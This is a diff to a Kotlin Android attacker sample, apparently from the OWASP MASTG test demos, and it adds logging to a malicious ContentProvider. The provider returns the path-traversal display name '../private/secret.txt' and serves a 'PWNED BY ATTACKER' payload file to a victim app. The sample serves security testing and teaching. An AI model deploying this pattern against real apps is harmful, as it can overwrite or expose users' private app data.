@@ -10,6 +10,7 @@ import android.database.MatrixCursor
 import android.net.Uri
 import android.os.Bundle
 import android.os.ParcelFileDescriptor
+import android.util.Log
 import android.view.Gravity
 import android.widget.TextView
 import java.io.File
@@ -18,10 +19,12 @@ import java.io.FileNotFoundException
 // SUMMARY: This sample demonstrates an attacker app that returns a path-traversal filename via a ContentProvider.
 class MastgTest(private val context: Context) {
 
+    companion object {
+        const val TAG = "RESULT_ATTACK"
+    }
+
     fun mastgTest(): String {
-        val r = DemoResults("0x06")
-        r.add(Status.FAIL, "This app should be invoked by an implicit intents from MASTG-DEMO-0139")
-        return r.toJson()
+        return "Install this app with MASTG-DEMO-0139 and select it when Android resolves REQUEST_FILE."
     }
 }
 
@@ -42,6 +45,7 @@ class AttackerActivity : Activity() {
             val resultIntent = Intent()
             resultIntent.data = Uri.parse("content://org.owasp.mastestapp.attacker.provider/fakeFile")
             resultIntent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
+            Log.e(MastgTest.TAG, "Returning URI=${resultIntent.data}")
             setResult(Activity.RESULT_OK, resultIntent)
             finish()
         }
@@ -59,6 +63,7 @@ class AttackerContentProvider : ContentProvider() {
         selectionArgs: Array<String>?,
         sortOrder: String?
     ): Cursor {
+        Log.e(MastgTest.TAG, "Providing DISPLAY_NAME=../private/secret.txt")
         val matrixCursor = MatrixCursor(arrayOf("_display_name"))
         matrixCursor.addRow(arrayOf<Any>("../private/secret.txt"))
         return matrixCursor
@@ -68,6 +73,7 @@ class AttackerContentProvider : ContentProvider() {
     override fun openFile(uri: Uri, mode: String): ParcelFileDescriptor {
         val cacheFile = File(context!!.cacheDir, "payload.txt")
         cacheFile.writeText("PWNED BY ATTACKER")
+        Log.e(MastgTest.TAG, "Serving payload for uri=$uri")
         return ParcelFileDescriptor.open(cacheFile, ParcelFileDescriptor.MODE_READ_ONLY)
     }
 
